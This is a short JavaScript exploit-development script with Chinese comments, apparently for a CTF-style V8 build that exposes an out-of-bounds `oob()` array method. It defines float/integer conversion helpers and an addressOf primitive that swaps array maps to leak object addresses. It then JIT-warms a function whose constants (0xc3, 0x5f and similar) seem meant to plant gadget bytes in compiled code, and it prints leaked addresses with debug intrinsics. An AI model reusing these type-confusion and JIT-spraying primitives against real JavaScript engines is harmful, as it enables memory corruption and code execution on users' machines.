// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××
var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
// 浮点数转换为64位无符号整数
function f2i(f)
{
	float64[0] = f;
	return bigUint64[0];
}
// 64位无符号整数转为浮点数
function i2f(i)
{
	bigUint64[0] = i;
	return float64[0];
}
// 64位无符号整数转为16进制字节串
function hex(i)
{
	return i.toString(16).padStart(16, "0");
}
// ××××××××2. addressOf和fakeObject的实现××××××××
var obj = {"a": 1};
var obj_array = [obj];
var float_array = [1.1];
var obj_array_map = obj_array.oob();
var float_array_map = float_array.oob();
// 泄露某个object的地址
function addressOf(obj_to_leak)
{
	obj_array[0] = obj_to_leak;
	obj_array.oob(float_array_map);
	let faked_obj = obj_array[0];
	obj_array.oob(obj_array_map);
	return hex(f2i(faked_obj));
}

function t(i, obja)
{
	var b = i % 0xc2;
    var d = i - 0xc2;
    var e = i ^ 0xc2;
    buf[0x58] = 0xc3;
    buf[0x5f] = 0xc3;
    buf[0x5a] = 0xc3;
    buf[0x5e] = 0xc3;
    buf[0xf] = 0x5;
    var extra = e + 0xc305;
    // buf[e + 0x5] = 0xc3;
	buf[0x5] = 0xc3;
	//%DebugPrint(test_obj);
	if (i == 9999) {
		console.log("[*] leak buf addr: 0x" + addressOf(buf));
		%DebugPrint(buf);
		console.log("[*] leak temp addr: 0x" + addressOf(t));
		%DebugPrint(t);
		%SystemBreak();
	}
	var result = b + d + e + extra;
	return result;
	//%SystemBreak();
}

for (var i = 0; i < 10000; i++)
	t(i, buf);